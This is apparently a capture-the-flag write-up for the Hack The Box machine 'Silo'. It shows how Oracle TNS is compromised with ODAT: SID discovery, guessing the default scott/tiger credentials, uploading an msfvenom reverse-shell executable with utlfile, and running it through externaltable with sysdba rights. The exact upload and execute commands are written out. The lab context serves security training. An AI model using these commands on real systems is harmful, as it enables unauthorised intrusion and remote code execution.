# Silo

#### Machine Info
![](screenshots/silo.png)



### Nmap
![](screenshots/nmap.png)


#### HTTP (Port 80)

Index Page:
![](screenshots/index.png)

Tried go buster but got nothing.

#### Oracle TNS listener (Port 1521)

##### Exploit on oracle database:

`ODAT`: An open source tool to test the Oracle Databases remotely.</br>
Github: https://github.com/quentinhardy/odat

First get `sid` with `ODAT`.:
![](screenshots/odat_sid.png)

By using the `sid` we get from preivous step, we can try to guess credentials:
![](screenshots/odat_passwd.png)

We got `scott/tiger`!!. Let's try if this is valid:
![](screenshots/sqlplus.png)

We can login to oracle database server which means credential is correct.


##### Exploit

First, generate windows reverse shell code using `msfvenom`:
![](screenshots/msfvenom.png)

By using `odat.py`, we can upload and execute files with system privilege. We have generated `shell.exe` and just upload to the server by using `utlfile`. Then execute by using `externaltable`.

```
# Upload shell.exe to the server
python3 odat.py utlfile -s 10.10.10.82 -U scott -P tiger -d XE --sysdba --putFile C:\\WINDOWS\\temp shell.exe ~/htb/machines/silo/shell.exe
```
![](screenshots/utlfile_upload.png)


```
# Execute shell.exe from the server
python3 odat.py externaltable -s 10.10.10.82 -U scott -P tiger -d XE --sysdba --exec C:\\WINDOWS\\temp shell.exe
```
![](screenshots/externaltable_exec.png)

And from `nc` listener on attacking side:
![](screenshots/externaltable_shell.png)


And you can get `root.txt` :)
